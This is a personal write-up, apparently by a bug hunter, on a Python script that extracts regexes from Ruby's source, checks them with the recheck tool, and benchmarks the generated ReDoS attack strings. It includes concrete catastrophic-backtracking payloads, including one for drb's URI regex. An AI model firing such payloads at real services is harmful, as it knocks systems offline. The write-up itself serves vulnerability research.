
# Testing ruby regexes in ruby source.

After reading this: https://hackerone.com/reports/1485501

I decided to program a script which get's all of the regexes from a directory and then tests them against this tool: https://makenowjust-labs.github.io/recheck/playground/

I actually found a regex which was vulnerable to ReDOS, but it is in the rdoc utility, which is out of scope. Here: https://github.com/ruby/ruby/blob/master/lib/rdoc/comment.rb#L205 in the remove_private function there is a regex which is vulnerable to redos.

## Getting all of the regexes out of the ruby source code.

First we need to just extract every regex out from the ruby code base.

Here is my code after a bit of scripting:

```


import re
import sys

DEBUG = 1

def debug(string: str) -> None:
	if DEBUG:
		print("[DEBUG] "+str(string))


def find_regex_in_line(line: str): # Returns false if no regex. Returns the regex string if found.
	if line.count("/") == 2 and "=~" in line:
		first_slash_ind = line.index("/")
		rest_of_string = line[first_slash_ind+1:]
		rest_of_string = rest_of_string[:rest_of_string.index("/")+1]
		final_regex = "/"+rest_of_string
		if len(final_regex) <= 5:
			return False # False positive
		return "/"+rest_of_string

def classify_regex(regex_str: str) -> None:
	# Stub for now
	return

def get_regexes(filename: str) -> list:
	# Get's every single regex pattern from a singular file.
	# This is a regex to detect regexes. :D
	#regex_regex = re.compile(r'/((?:(?:[^?+*{}()[\]\\|]+|\\.|\[(?:\^?\\.|\^[^\\]|[^\\^])(?:[^\]\\]+|\\.)*\]|\((?:\?[:=!]|\?<[=!]|\?>)?(?1)??\)|\(\?(?:R|[+-]?\d+)\))(?:(?:[?+*]|\{\d+(?:,\d*)?\})[?+]?)?|\|)*)/')
	fh = open(filename, "r")
	try:
		lines = fh.readlines()
	except:
		print("Paskaaaaaa "+str(filename))
		fh.close()
		return
	fh.close()

	for line in lines:
		# Check for two "/" characters.
		maybe_regex = find_regex_in_line(line)
		if maybe_regex:
			debug("Here is a regex which we found: "+str(maybe_regex))
			# Here maybe check for a bad regex????
			classify_regex(maybe_regex)


'''

recheck [--acceleration-mode <mode>] [--attack-limit <integer>] [--attack-timeout <duration>] [--checker <checker>] [--crossover-size <integer>] [--heat-ratio <floating-point>] [--incubation-limit <integer>] [--incubation-timeout <duration>] [--enable-log] [--max-attack-string-size <integer>] [--max-degree <integer>] [--max-gene-string-size <integer>] [--max-generation-size <integer>] [--max-initial-generation-size <integer>] [--max-iteration <integer>] [--max-nfa-size <integer>] [--max-pattern-size <integer>] [--max-recall-string-size <integer>] [--max-repeat-count <integer>] [--max-simple-repeat-count <integer>] [--mutation-size <integer>] [--random-seed <integer>] [--recall-limit <integer>] [--recall-timeout <duration>] [--seeder <seeder>] [--seeding-limit <integer>] [--seeding-timeout <duration>] [--timeout <duration>] <pattern>

recheck --attack-limit 1000 --attack-timeout 10000 --enable-log "a*a"

'''


BLACKLIST_STRINGS = ["test", "rdoc", "bundler"]

def main() -> int:
	# This file checks each file in the current directory for the redos vulnerability.
	import os
	rootdir = '.'
	debug("len(sys.argv) == "+str(len(sys.argv)))
	if len(sys.argv) == 2: # There is a directory after the script
		rootdir = sys.argv[-1]
	all_regexes = []

	for subdir, dirs, files in os.walk(rootdir):
		for file in files:
			#print(os.path.join(subdir, file))
			filename = os.path.join(subdir, file)
			if any([string in filename for string in BLACKLIST_STRINGS]):
				#debug("Blacklisted filename: "+str(filename))
				continue
			# Get the regexes
			#all_regexes += get_regexes(filename)
			if ".rb" not in filename:
				continue
			#debug("Now trying to read this: "+str(filename))
			get_regexes(filename)
	print("Done!")
	return 0

if __name__=="__main__":
	exit(main())


```

Now what we do is we run every every one of these regexes through recheck and see what it says, then if it says that it is vulnerable, then we can do some other test or stuff.

Here it is:

```


import re
import sys
import subprocess
import os
import time

DEBUG = 1

def debug(string: str) -> None:
	if DEBUG:
		print("[DEBUG] "+str(string))


def find_regex_in_line(line: str): # Returns false if no regex. Returns the regex string if found.
	if line.count("/") == 2 and "=~" in line:
		first_slash_ind = line.index("/")
		rest_of_string = line[first_slash_ind+1:]
		rest_of_string = rest_of_string[:rest_of_string.index("/")+1]
		final_regex = "/"+rest_of_string
		if len(final_regex) <= 5:
			return False # False positive
		return "/"+rest_of_string


RECHECK_DIR = "/home/cyberhacker/Asioita/regexchecking/recheck/modules/recheck-cli/target/native-image/"

def classify_regex(regex_str: str, filename: str) -> None:

	#command_str = "./recheck --attack-limit 1000  --enable-log "/^(a|a)*$/""
	command_str = RECHECK_DIR + "recheck --attack-limit 1000  --enable-log \""+str(regex_str)+"\" > output.txt"
	# Now we run the command and get output.
	#output = subprocess.check_output(command_str.split(" "))
	print("Here is the output from recheck:")
	#print(output)
	os.system(command_str)
	time.sleep(0.2)
	fh = open("output.txt", "r")
	contents = fh.read()
	fh.close()
	if "4th" in contents:
		print("DINGDING!!!! "+str(filename))
	print(contents)
	return

def get_regexes(filename: str) -> list:
	# Get's every single regex pattern from a singular file.
	# This is a regex to detect regexes. :D
	#regex_regex = re.compile(r'/((?:(?:[^?+*{}()[\]\\|]+|\\.|\[(?:\^?\\.|\^[^\\]|[^\\^])(?:[^\]\\]+|\\.)*\]|\((?:\?[:=!]|\?<[=!]|\?>)?(?1)??\)|\(\?(?:R|[+-]?\d+)\))(?:(?:[?+*]|\{\d+(?:,\d*)?\})[?+]?)?|\|)*)/')
	fh = open(filename, "r")
	try:
		lines = fh.readlines()
	except:
		print("Paskaaaaaa "+str(filename))
		fh.close()
		return
	fh.close()

	for line in lines:
		# Check for two "/" characters.
		maybe_regex = find_regex_in_line(line)

		if maybe_regex:
			assert maybe_regex.count("/") == 2
			debug("Here is a regex which we found: "+str(maybe_regex))
			# Here maybe check for a bad regex????
			classify_regex(maybe_regex, filename)


'''

recheck [--acceleration-mode <mode>] [--attack-limit <integer>] [--attack-timeout <duration>] [--checker <checker>] [--crossover-size <integer>] [--heat-ratio <floating-point>] [--incubation-limit <integer>] [--incubation-timeout <duration>] [--enable-log] [--max-attack-string-size <integer>] [--max-degree <integer>] [--max-gene-string-size <integer>] [--max-generation-size <integer>] [--max-initial-generation-size <integer>] [--max-iteration <integer>] [--max-nfa-size <integer>] [--max-pattern-size <integer>] [--max-recall-string-size <integer>] [--max-repeat-count <integer>] [--max-simple-repeat-count <integer>] [--mutation-size <integer>] [--random-seed <integer>] [--recall-limit <integer>] [--recall-timeout <duration>] [--seeder <seeder>] [--seeding-limit <integer>] [--seeding-timeout <duration>] [--timeout <duration>] <pattern>

recheck --attack-limit 1000 --attack-timeout 10000 --enable-log "a*a"

'''


BLACKLIST_STRINGS = ["test", "rdoc", "bundler"]

def main() -> int:
	# This file checks each file in the current directory for the redos vulnerability.
	import os
	rootdir = '.'
	debug("len(sys.argv) == "+str(len(sys.argv)))
	if len(sys.argv) == 2: # There is a directory after the script
		rootdir = sys.argv[-1]
	all_regexes = []

	for subdir, dirs, files in os.walk(rootdir):
		for file in files:
			#print(os.path.join(subdir, file))
			filename = os.path.join(subdir, file)
			if any([string in filename for string in BLACKLIST_STRINGS]):
				#debug("Blacklisted filename: "+str(filename))
				continue
			# Get the regexes
			#all_regexes += get_regexes(filename)
			if ".rb" not in filename:
				continue
			debug("Now trying to read this: "+str(filename))
			get_regexes(filename)
	print("Done!")
	return 0

if __name__=="__main__":
	exit(main())


```


ok, so now when we identify the possibly vulnerable regexes, we need to program a ruby script which actually verifies if they need a lot of time.

First of all, we need to parse the attack string. This turned out to be quite difficult, because of some dumbass corner cases, but I managed it.

Here is my somewhat working script:


```


import re
import sys
import subprocess
import os
import time

DEBUG = 1

def debug(string: str) -> None:
	if DEBUG:
		print("[DEBUG] "+str(string))


def find_regex_in_line(line: str): # Returns false if no regex. Returns the regex string if found.
	if line.count("/") == 2 and "=~" in line:
		first_slash_ind = line.index("/")
		rest_of_string = line[first_slash_ind+1:]
		rest_of_string = rest_of_string[:rest_of_string.index("/")+1]
		final_regex = "/"+rest_of_string
		if len(final_regex) <= 5:
			return False # False positive
		return "/"+rest_of_string


RECHECK_DIR = "/home/cyberhacker/Asioita/regexchecking/recheck/modules/recheck-cli/target/native-image/"

def get_string(string: str) -> str:
	debug("Here is the string in get_string: "+str(string))
	new_string = string[string.index("'")+1:]
	print("new_string == "+str(new_string))
	if "'" in new_string:

		new_string = new_string[:new_string.index("'")]
	else:
		return new_string
	return new_string

#STRING_COUNT = 3

STRING_COUNT = 100000


def parse_repeated(tok) -> str:
	debug("Processing repeated token: "+str(tok))
	assert tok.count("'") == 2
	
	# Now just return the shit.
	oof_string = get_string(tok)

	final_string = oof_string * STRING_COUNT
	return final_string

def exec_str(string: str) -> str: # This evaluates the attack str string.
	tokens = string.split(" ")
	# This is here to check for ' ' <--- this case
	if tokens.count("'") == 2:
		ind_of_string_start = tokens.index("'")
		if tokens[ind_of_string_start+1] == "'":
			tokens[ind_of_string_start] = "' '"
			tokens.pop(ind_of_string_start+1)
	while "+" in tokens:
		tokens.remove("+")
	# Now evaluate the string.
	out = ""
	for tok in tokens:
		if "repeat" in tok:
			out += parse_repeated(tok)
		else:
			out += get_string(tok)
	debug("Here is the final payload string: "+str(out))
	return out

def parse_payload(contents) -> str:
	if "Attack string: " not in contents:
		return
	attack_str = contents[contents.index("Attack string: ")+len("Attack string: "):]
	print(attack_str)
	attack_str = attack_str[:attack_str.index("\n")]
	print("Here is the attack_str: "+str(attack_str))
	if "' '" in attack_str:
		return
	payload = exec_str(attack_str)

	# write the string to the file and then pass the regex to this ruby script.
	fh = open("attack_str.txt", "w")
	fh.write(payload)
	fh.close()





def classify_regex(regex_str: str, filename: str) -> None:

	#command_str = "./recheck --attack-limit 1000  --enable-log "/^(a|a)*$/""
	command_str = RECHECK_DIR + "recheck --attack-limit 1000  --enable-log \""+str(regex_str)+"\" > output.txt"
	# Now we run the command and get output.
	#output = subprocess.check_output(command_str.split(" "))
	print("Here is the output from recheck:")
	#print(output)
	os.system(command_str)
	time.sleep(0.2)
	fh = open("output.txt", "r")
	contents = fh.read()
	fh.close()
	if "safe" in contents:
		return
	if "4th" in contents:
		print("DINGDING!!!! "+str(filename))
	print(contents)

	# Here get the attack payload.
	attack_payload = parse_payload(contents)
	# Write the actual regex to regex.txt
	fh = open("regex.txt", "w")
	fh.write(regex_str)
	fh.close()

	redos_command = "ruby shit.rb"

	# Now try running the benchmark. If it times out, then we may have redos.
	debug("Running this command: "+str(redos_command))

	os.system(redos_command)

	return

def get_regexes(filename: str) -> list:
	# Get's every single regex pattern from a singular file.
	# This is a regex to detect regexes. :D
	#regex_regex = re.compile(r'/((?:(?:[^?+*{}()[\]\\|]+|\\.|\[(?:\^?\\.|\^[^\\]|[^\\^])(?:[^\]\\]+|\\.)*\]|\((?:\?[:=!]|\?<[=!]|\?>)?(?1)??\)|\(\?(?:R|[+-]?\d+)\))(?:(?:[?+*]|\{\d+(?:,\d*)?\})[?+]?)?|\|)*)/')
	fh = open(filename, "r")
	try:
		lines = fh.readlines()
	except:
		print("Paskaaaaaa "+str(filename))
		fh.close()
		return
	fh.close()

	for line in lines:
		# Check for two "/" characters.
		maybe_regex = find_regex_in_line(line)

		if maybe_regex:
			assert maybe_regex.count("/") == 2
			debug("Here is a regex which we found: "+str(maybe_regex))
			# Here maybe check for a bad regex????
			classify_regex(maybe_regex, filename)


'''

recheck [--acceleration-mode <mode>] [--attack-limit <integer>] [--attack-timeout <duration>] [--checker <checker>] [--crossover-size <integer>] [--heat-ratio <floating-point>] [--incubation-limit <integer>] [--incubation-timeout <duration>] [--enable-log] [--max-attack-string-size <integer>] [--max-degree <integer>] [--max-gene-string-size <integer>] [--max-generation-size <integer>] [--max-initial-generation-size <integer>] [--max-iteration <integer>] [--max-nfa-size <integer>] [--max-pattern-size <integer>] [--max-recall-string-size <integer>] [--max-repeat-count <integer>] [--max-simple-repeat-count <integer>] [--mutation-size <integer>] [--random-seed <integer>] [--recall-limit <integer>] [--recall-timeout <duration>] [--seeder <seeder>] [--seeding-limit <integer>] [--seeding-timeout <duration>] [--timeout <duration>] <pattern>

recheck --attack-limit 1000 --attack-timeout 10000 --enable-log "a*a"

'''


BLACKLIST_STRINGS = ["test", "rdoc", "bundler"]

def main() -> int:
	# This file checks each file in the current directory for the redos vulnerability.
	import os
	rootdir = '.'
	debug("len(sys.argv) == "+str(len(sys.argv)))
	if len(sys.argv) == 2: # There is a directory after the script
		rootdir = sys.argv[-1]
	all_regexes = []

	for subdir, dirs, files in os.walk(rootdir):
		for file in files:
			#print(os.path.join(subdir, file))
			filename = os.path.join(subdir, file)
			if any([string in filename for string in BLACKLIST_STRINGS]):
				#debug("Blacklisted filename: "+str(filename))
				continue
			# Get the regexes
			#all_regexes += get_regexes(filename)
			if ".rb" not in filename:
				continue
			debug("Now trying to read this: "+str(filename))
			get_regexes(filename)
	print("Done!")
	return 0

if __name__=="__main__":
	exit(main())



```


and here is shit.rb : 

```
require 'benchmark'
require 'time'
require 'uri'
def rfc2822_parse(length)
  #attack_str = "A"*length
  #attack_str = "0 Feb 00 00 :00" + " " * length
  #attack_str = "\n"*length
  # '-*-' + '\t'.repeat(54773) + '\t-*-\n\x00-*-'

  #attack_str = "-\*-" + "\t" * length + "\t-\*-\n"
  #puts "-\*-" + "\t" * 1 + "\t-\*-\n"


  #attack_str = 'A'*length + '-*-\r' + '\t'*length + '\x00-*-'*length + '-*-\r--*-\n'

  #attack_str = "A"*length + "-*-\r" + "\t"*length + "\x00-*-"*length + "-*-\r--*-\n"
  #attack_str = "\t"*length

  #attack_str = "\x00" + "--+"*(length) + "\n"
  #attack_str = 'name=Content-Disposition:'*(10955) + 'name="'

  #attack_str = "A\x00" + "zz@\x00z\x00zA@z,\x00"*(27) + "zz"
  #attack_str = "A" + "zz@zzA@z,"*(length) + "zz"

  #attack_str = "zz@z,a,a,a,a"*(length)
  #attack_str = "aaaa@aaa.com"
  #attack_str = "zz@zfefefe;a@a;a@a;a@a"
  #attack_str = "zz@zzz;"+"a@a;"*length
  #attack_str = ARGF.read * length
  attack_str = File.read("attack_str.txt")
  #attack_str = ":\x00"*(length) + ":\n::"
  # ' ' + ' : '.repeat(331) + '\n'

  #attack_str = " " + " : " * length + "\n"
  puts attack_str
  #puts attack_str
  #/\A[a-zA-Z0-9.!\#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\z/ =~ attack_str
  #/(?:(?:[a-zA-Z\d](?:[-a-zA-Z\d]*[a-zA-Z\d])?)\.)*(?:[a-zA-Z](?:[-a-zA-Z\d]*[a-zA-Z\d])?)\.?/ =~ attack_str
  #/^\s*:?call-seq:(.*?)(^\s*$|\z)/m =~ attack_str
  #/-\*-\s*(.*?\S)\s*-\*-/ =~ attack_str
  # 'A'.repeat(279) + '-*-\r' + '\t'.repeat(279) + '\x00-*-'.repeat(279) + '-*-\r--*-\n'
  #if /\A.*-\*-\s*(.*?\S)\s*-\*-.*\r?\n/ =~ attack_str
  #if /(.*?\S)/ =~ attack_str
  #if /\s*([#*]?)--.*?^\s*(\1)\+\+\n/ =~ attack_str
  #if /;[\r\n\t ]+?([^\x00- ()<>@,;:\\"/\[\]?={}\x7f]+)[\r\n\t ]+?=[\r\n\t ]+?(?:([^\x00- ()<>@,;:\\"/\[\]?={}\x7f]+)|("(?:[\r\n\t !#-\[\]-~\x80-\xff]|\\[\x00-\x7f])*"))/ =~ attack_str
  #if /Content-Disposition:.* name=(?:"(.*?)"|([^;\r\n]*))/ =~ attack_str
  #if /\A(?:[^@,;]+@[^@,;]+(?:\z|[,;]))*\z/ =~ attack_str
  #if /.*::/ =~ attack_str

  regex_str = File.read("regex.txt")

  #if /^([ ]*)(.+)(?::(?=(?:\s|$)))[ ]?(['"]?)(.*)\3$/ =~ attack_str
  if (Regexp.new regex_str) =~ attack_str
    puts "qqq"
  end
rescue URI::InvalidComponentError
  nil
end

Benchmark.bm do |x|
  #x.report { rfc2822_parse(100) }
  #x.report { rfc2822_parse(1000) }
  #x.report { rfc2822_parse(10000) }
  x.report { rfc2822_parse(100000) }
end
```

now, let's see if we actually find hangs.


...

After a bit of revisioning, I now decide to get rid of the "\A" marker at the start, because the recheck tool doesn't handle it properly and thinks that it is just a regular A character.

Here is my current code:

```


import re
import sys
import subprocess
import os
import time
from shlex import quote
import random


DEBUG = 1

def debug(string: str) -> None:
	if DEBUG:
		print("[DEBUG] "+str(string))


def find_regex_in_line(line: str): # Returns false if no regex. Returns the regex string if found.
	debug("Line: "+str(line))
	if line.count("/") == 2 and "=~" in line:
		first_slash_ind = line.index("/")
		rest_of_string = line[first_slash_ind+1:]
		rest_of_string = rest_of_string[:rest_of_string.index("/")+1]
		final_regex = "/"+rest_of_string
		if len(final_regex) <= 5:
			return False # False positive
		fh = open("regex_list.txt", "a")
		fh.write(final_regex+"\n")
		fh.close()
		return final_regex


RECHECK_DIR = "/home/cyberhacker/Asioita/regexchecking/recheck/modules/recheck-cli/target/native-image/"

def get_string(string: str) -> str:
	debug("Here is the string in get_string: "+str(string))
	new_string = string[string.index("'")+1:]
	print("new_string == "+str(new_string))
	if "'" in new_string:

		new_string = new_string[:new_string.index("'")]
	else:
		return new_string
	return new_string

#STRING_COUNT = 3

STRING_COUNT = 100000


def parse_repeated(tok) -> str:
	debug("Processing repeated token: "+str(tok))
	assert tok.count("'") == 2
	
	# Now just return the shit.
	oof_string = get_string(tok)

	final_string = oof_string * STRING_COUNT
	return final_string

def parse_repeated_debug(tok) -> str:
	debug("Processing repeated token: "+str(tok))
	assert tok.count("'") == 2
	
	# Now just return the shit.
	oof_string = get_string(tok)

	final_string = oof_string * 10
	return final_string


def exec_str(string: str) -> str: # This evaluates the attack str string.
	tokens = string.split(" + ")
	# This is here to check for ' ' <--- this case
	if tokens.count("'") == 2:
		ind_of_string_start = tokens.index("'")
		if tokens[ind_of_string_start+1] == "'":
			tokens[ind_of_string_start] = "' '"
			tokens.pop(ind_of_string_start+1)
	while "+" in tokens:
		tokens.remove("+")
	# Now evaluate the string.
	out = ""
	for tok in tokens:
		if "repeat" in tok:
			out += parse_repeated(tok)
		else:
			out += get_string(tok)
	debug("Here is the final payload string: "+str(out))
	return out

def exec_str_debug(string: str) -> str: # This evaluates the attack str string.
	tokens = string.split(" + ")
	# This is here to check for ' ' <--- this case
	if tokens.count("'") == 2:
		ind_of_string_start = tokens.index("'")
		if tokens[ind_of_string_start+1] == "'":
			tokens[ind_of_string_start] = "' '"
			tokens.pop(ind_of_string_start+1)
	while "+" in tokens:
		tokens.remove("+")
	# Now evaluate the string.
	out = ""
	for tok in tokens:
		if "repeat" in tok:
			out += parse_repeated_debug(tok)
		else:
			out += get_string(tok)
	debug("Here is the final payload string: "+str(out))
	return out

def rand_str(length: int) -> str:
	alphabet = "abcdefghijklmnopqrstuvxyz"
	return ''.join([random.choice(alphabet) for _ in range(length)])

def parse_payload(contents, regex_str, debug=False, final_order=None) -> str:
	if "Attack string: " not in contents:
		return
	attack_str = contents[contents.index("Attack string: ")+len("Attack string: "):]
	print(attack_str)
	attack_str = attack_str[:attack_str.index("\n")]
	print("Here is the attack_str: "+str(attack_str))
	if "' '" in attack_str:
		return
	payload = exec_str(attack_str)
	if debug:

		debug_thing = exec_str_debug(attack_str)
		fh = open("debug/"+str(rand_str(10)), "w")
		fh.write(debug_thing)
		fh.write("\n\n\n")
		fh.write(regex_str)
		fh.write("\n\n\n")
		fh.write("Here is the order: "+str(final_order))
		fh.close()
	# write the string to the file and then pass the regex to this ruby script.
	fh = open("attack_str.txt", "w")
	fh.write(payload)
	fh.close()



ORDERS = ["2nd", "3rd", "4th", "5th", "6th", "7th", "8th"]

def classify_regex(regex_str: str, filename: str) -> None:

	#command_str = "./recheck --attack-limit 1000  --enable-log "/^(a|a)*$/""
	command_str = RECHECK_DIR + "recheck --attack-limit 1000  --enable-log "+str(quote(regex_str))+" > output.txt"
	# Now we run the command and get output.
	#output = subprocess.check_output(command_str.split(" "))
	print("Here is the output from recheck:")
	#print(output)
	os.system(command_str)
	time.sleep(0.2)
	fh = open("output.txt", "r")
	contents = fh.read()
	fh.close()
	if "safe" in contents:
		return
	final_order = None
	debug_mode = False
	for order in ORDERS:
		if order in contents:
			print(str(order)+" found at here: "+str(regex_str)+" at filename "+str(filename))
			if order == "3rd" or order == "4th" or order == "5th" or order == "6th" or order == "7th" or order == "8th":
				final_order = order
				debug_mode = True
			break
	#if "4th" in contents:
	#	print("4th!!!! "+str(filename))
	print(contents)



	# Here get the attack payload.
	attack_payload = parse_payload(contents, regex_str, debug=debug_mode, final_order=final_order)
	# Write the actual regex to regex.txt
	fh = open("regex.txt", "w")
	fh.write(regex_str)
	fh.close()

	redos_command = "ruby shit.rb"

	# Now try running the benchmark. If it times out, then we may have redos.
	debug("Running this command: "+str(redos_command))

	os.system(redos_command)

	return

def get_regexes(filename: str) -> list:
	# Get's every single regex pattern from a singular file.
	# This is a regex to detect regexes. :D
	#regex_regex = re.compile(r'/((?:(?:[^?+*{}()[\]\\|]+|\\.|\[(?:\^?\\.|\^[^\\]|[^\\^])(?:[^\]\\]+|\\.)*\]|\((?:\?[:=!]|\?<[=!]|\?>)?(?1)??\)|\(\?(?:R|[+-]?\d+)\))(?:(?:[?+*]|\{\d+(?:,\d*)?\})[?+]?)?|\|)*)/')
	fh = open(filename, "r")
	try:
		lines = fh.readlines()
	except:
		print("Paskaaaaaa "+str(filename))
		fh.close()
		return
	fh.close()

	for line in lines:
		# Check for two "/" characters.
		maybe_regex = find_regex_in_line(line)
		debug("Maybe regex: "+str(maybe_regex))
		if maybe_regex:
			assert maybe_regex.count("/") == 2
			debug("Here is a regex which we found: "+str(maybe_regex))
			# Here maybe check for a bad regex????
			classify_regex(maybe_regex, filename)


'''

recheck [--acceleration-mode <mode>] [--attack-limit <integer>] [--attack-timeout <duration>] [--checker <checker>] [--crossover-size <integer>] [--heat-ratio <floating-point>] [--incubation-limit <integer>] [--incubation-timeout <duration>] [--enable-log] [--max-attack-string-size <integer>] [--max-degree <integer>] [--max-gene-string-size <integer>] [--max-generation-size <integer>] [--max-initial-generation-size <integer>] [--max-iteration <integer>] [--max-nfa-size <integer>] [--max-pattern-size <integer>] [--max-recall-string-size <integer>] [--max-repeat-count <integer>] [--max-simple-repeat-count <integer>] [--mutation-size <integer>] [--random-seed <integer>] [--recall-limit <integer>] [--recall-timeout <duration>] [--seeder <seeder>] [--seeding-limit <integer>] [--seeding-timeout <duration>] [--timeout <duration>] <pattern>

recheck --attack-limit 1000 --attack-timeout 10000 --enable-log "a*a"

'''


BLACKLIST_STRINGS = ["test", "rdoc", "bundler", "shit"]

def main() -> int:
	# This file checks each file in the current directory for the redos vulnerability.
	import os
	rootdir = '.'
	debug("len(sys.argv) == "+str(len(sys.argv)))
	if len(sys.argv) == 2: # There is a directory after the script
		rootdir = sys.argv[-1]
	all_regexes = []

	for subdir, dirs, files in os.walk(rootdir):
		for file in files:
			#print(os.path.join(subdir, file))

			filename = os.path.join(subdir, file)
			debug("Filename : "+str(filename))
			if any([string in filename for string in BLACKLIST_STRINGS]):
				#debug("Blacklisted filename: "+str(filename))
				continue
			# Get the regexes
			#all_regexes += get_regexes(filename)
			if ".rb" not in filename:
				continue
			debug("Now trying to read this: "+str(filename))
			get_regexes(filename)
	print("Done!")
	return 0

if __name__=="__main__":
	exit(main())


```

The `/\*\[(.*)\]/` regex is vulnerable it seems. it is in container-type.rb .

There is actually a bug in my program. The Regexp.new doesn't need the surrounding "/" characters. See:


```

require 'benchmark'
require 'time'
require 'uri'
def rfc2822_parse(length)
  #attack_str = "A"*length
  #attack_str = "0 Feb 00 00 :00" + " " * length
  #attack_str = "\n"*length
  # '-*-' + '\t'.repeat(54773) + '\t-*-\n\x00-*-'

  #attack_str = "-\*-" + "\t" * length + "\t-\*-\n"
  #puts "-\*-" + "\t" * 1 + "\t-\*-\n"


  #attack_str = 'A'*length + '-*-\r' + '\t'*length + '\x00-*-'*length + '-*-\r--*-\n'

  #attack_str = "A"*length + "-*-\r" + "\t"*length + "\x00-*-"*length + "-*-\r--*-\n"
  #attack_str = "\t"*length

  #attack_str = "\x00" + "--+"*(length) + "\n"
  #attack_str = 'name=Content-Disposition:'*(10955) + 'name="'

  #attack_str = "A\x00" + "zz@\x00z\x00zA@z,\x00"*(27) + "zz"
  #attack_str = "A" + "zz@zzA@z,"*(length) + "zz"

  #attack_str = "zz@z,a,a,a,a"*(length)
  #attack_str = "aaaa@aaa.com"
  #attack_str = "zz@zfefefe;a@a;a@a;a@a"
  #attack_str = "zz@zzz;"+"a@a;"*length
  #attack_str = ARGF.read * length
  attack_str = File.read("attack_str.txt")
  #attack_str = ":\x00"*(length) + ":\n::"
  # ' ' + ' : '.repeat(331) + '\n'

  #attack_str = " " + " : " * length + "\n"
  #puts attack_str
  #puts attack_str
  #/\A[a-zA-Z0-9.!\#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\z/ =~ attack_str
  #/(?:(?:[a-zA-Z\d](?:[-a-zA-Z\d]*[a-zA-Z\d])?)\.)*(?:[a-zA-Z](?:[-a-zA-Z\d]*[a-zA-Z\d])?)\.?/ =~ attack_str
  #/^\s*:?call-seq:(.*?)(^\s*$|\z)/m =~ attack_str
  #/-\*-\s*(.*?\S)\s*-\*-/ =~ attack_str
  # 'A'.repeat(279) + '-*-\r' + '\t'.repeat(279) + '\x00-*-'.repeat(279) + '-*-\r--*-\n'
  #if /\A.*-\*-\s*(.*?\S)\s*-\*-.*\r?\n/ =~ attack_str
  #if /(.*?\S)/ =~ attack_str
  #if /\s*([#*]?)--.*?^\s*(\1)\+\+\n/ =~ attack_str
  #if /;[\r\n\t ]+?([^\x00- ()<>@,;:\\"/\[\]?={}\x7f]+)[\r\n\t ]+?=[\r\n\t ]+?(?:([^\x00- ()<>@,;:\\"/\[\]?={}\x7f]+)|("(?:[\r\n\t !#-\[\]-~\x80-\xff]|\\[\x00-\x7f])*"))/ =~ attack_str
  #if /Content-Disposition:.* name=(?:"(.*?)"|([^;\r\n]*))/ =~ attack_str
  #if /\A(?:[^@,;]+@[^@,;]+(?:\z|[,;]))*\z/ =~ attack_str
  #if /.*::/ =~ attack_str

  regex_str = File.read("regex.txt")
  if (Regexp.new '/poopoo/') =~ "poopoo"
    puts("Passed1")
  end
  if (Regexp.new 'poopoo') =~ "poopoo"
    puts("Passed2")
  end


  if (eval '/poopoo/') =~ "poopoo"
    puts("Passed3")
  end
  #if /^([ ]*)(.+)(?::(?=(?:\s|$)))[ ]?(['"]?)(.*)\3$/ =~ attack_str
  if (Regexp.new regex_str) =~ attack_str
    puts "qqq"
  end
rescue URI::InvalidComponentError
  nil
end

Benchmark.bm do |x|
  #x.report { rfc2822_parse(100) }
  #x.report { rfc2822_parse(1000) }
  #x.report { rfc2822_parse(10000) }
  x.report { rfc2822_parse(100000) }
end

```

and it only prints this:

```

       user     system      total        real
 Passed2
Passed3
  0.000487   0.000049   0.000536 (  0.000534)


```

Now that I have fixed that bug, let's see what happens. Now it works! Now it hangs on some of the executions. Now we just need to detect the ones which hang and report them!


Here is an example report:

```

drb0drb0drb0drb0drb0drb0drb0drb0drb0drb0\x00drbd:


/drb([a-z0-9]+):/


Here is the order: 2nd


'drb0'.repeat(27387) + '\x00drbd:'


/home/cyberhacker/Asioita/Hakkerointi/Rubydatetime/ruby/.bundle/gems/drb-2.2.0/lib/drb/drb.rb

```


and it seems to be quite good. Now, I set a timeout of twenty seconds for the hang and now I am running the program against the ruby source code. Of course this won't catch every regex, because many regexes are assigned to a variable before the "=~" operator.

Let's see what it finds.


Ok, so it found a couple of interesting redos bugs, but nothing too major.




One thing is that there are plenty of ".sub" and ".gsub" statements in the code, and my code currently doesn't catch those regexes. Sooo, let's add that maybe?

Here is the improved code:

```


import re
import sys
import subprocess
import os
import time
from shlex import quote
import random


DEBUG = 1

def debug(string: str) -> None:
	if DEBUG:
		print("[DEBUG] "+str(string))


def find_regex_in_sub(line: str): # This is here to handle cases such as this: v.gsub!(/(?!%\h\h|[!-~])./n){'%%%02X' % $&.ord}   (this example is from lib/uri/generic.rb)

	if ".gsub(" in line or ".sub(" in line:
		#assert line.count("sub(") == 1 # There should only be one substitution statement per line.
		maybe_regex = line[line.index("sub(")+4:]
		print("Here is the string in a possible sub: "+str(maybe_regex))
		if maybe_regex[0] == "/": # Regex found.
			# Now get the separator.
			if "/, " not in maybe_regex:
				return False
			maybe_regex = maybe_regex[:maybe_regex.index("/, ")+1]
			#print("Here is the extracted regex: "+str(maybe_regex))
			if maybe_regex[0] == "/" and maybe_regex[-1] == "/":
				debug("Here is the extracted regex: "+str(maybe_regex))
				return maybe_regex
			else:
				debug("Something went wrong processing this file: "+str(line)+"  . Returning False for now...")

	return False


def find_regex_in_line(line: str): # Returns false if no regex. Returns the regex string if found.
	debug("Line: "+str(line))
	if line.count("/") == 2 and "=~" in line:
		first_slash_ind = line.index("/")
		rest_of_string = line[first_slash_ind+1:]
		rest_of_string = rest_of_string[:rest_of_string.index("/")+1]
		final_regex = "/"+rest_of_string
		if len(final_regex) <= 5:
			return False # False positive
		fh = open("regex_list.txt", "a")
		fh.write(final_regex+"\n")
		fh.close()
		return final_regex
	
	return find_regex_in_sub(line)


RECHECK_DIR = "/home/cyberhacker/Asioita/regexchecking/recheck/modules/recheck-cli/target/native-image/"

def get_string(string: str) -> str:
	debug("Here is the string in get_string: "+str(string))
	new_string = string[string.index("'")+1:]
	print("new_string == "+str(new_string))
	if "'" in new_string:

		new_string = new_string[:new_string.index("'")]
	else:
		return new_string
	return new_string

#STRING_COUNT = 3

STRING_COUNT = 100000


def parse_repeated(tok) -> str:
	debug("Processing repeated token: "+str(tok))
